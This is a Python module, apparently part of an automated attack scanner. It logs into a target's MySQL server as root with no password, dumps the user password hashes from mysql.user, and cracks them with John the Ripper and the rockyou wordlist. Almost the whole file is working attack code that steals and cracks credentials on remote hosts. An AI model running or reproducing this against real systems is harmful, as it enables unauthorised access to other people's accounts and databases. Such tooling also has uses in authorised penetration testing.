import subprocess
import tempfile
import os

# Hash formats John can identify per service port
PORT_HASH_FORMAT = {
    22:   "sha512crypt",
    21:   "md5crypt",
    3306: "mysql-sha1",
    5432: "dynamic_1034",
    139:  "nt",
    445:  "nt",
    3389: "nt",
}

DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"

def john_crack(hashes, hash_format=None):
    """Run john against a list of hash strings. Returns cracked results."""
    if not hashes:
        return []

    cracked = []
    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
        f.write("\n".join(hashes))
        hash_file = f.name

    try:
        cmd = ["john", hash_file, f"--wordlist={DEFAULT_WORDLIST}"]
        if hash_format:
            cmd.append(f"--format={hash_format}")

        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)

        show = subprocess.check_output(
            ["john", "--show", hash_file],
            stderr=subprocess.DEVNULL, timeout=10, text=True
        )
        for line in show.splitlines():
            if ":" in line and not line.startswith("0 password"):
                cracked.append(line.strip())
    except subprocess.TimeoutExpired:
        print(f"[John] Timeout cracking hashes")
    except Exception as e:
        print(f"[John Error] {e}")
    finally:
        os.unlink(hash_file)

    return cracked[:10]


def john_scan(target, open_ports, hashes=None):
    """
    Entry point called from deep_scan.
    If hashes are provided (e.g. grabbed from SMB/FTP), crack them.
    Otherwise attempt to identify hash format from open ports and crack defaults.
    """
    if not hashes:
        # Try to pull /etc/shadow style hashes via known exposed ports
        hashes = _try_grab_hashes(target, open_ports)

    if not hashes:
        return []

    hash_format = None
    for port in open_ports:
        if port in PORT_HASH_FORMAT:
            hash_format = PORT_HASH_FORMAT[port]
            break

    return john_crack(hashes, hash_format)


def _try_grab_hashes(target, open_ports):
    """Attempt to grab hashes from exposed services (best-effort)."""
    hashes = []

    # Try MySQL anonymous hash dump
    if 3306 in open_ports:
        try:
            out = subprocess.check_output(
                ["mysql", "-h", target, "-u", "root", "--connect-timeout=5",
                 "-e", "SELECT user, authentication_string FROM mysql.user;"],
                stderr=subprocess.DEVNULL, timeout=10, text=True
            )
            for line in out.splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 2 and parts[1].startswith("*"):
                    hashes.append(parts[1])
        except Exception:
            pass

    return hashes
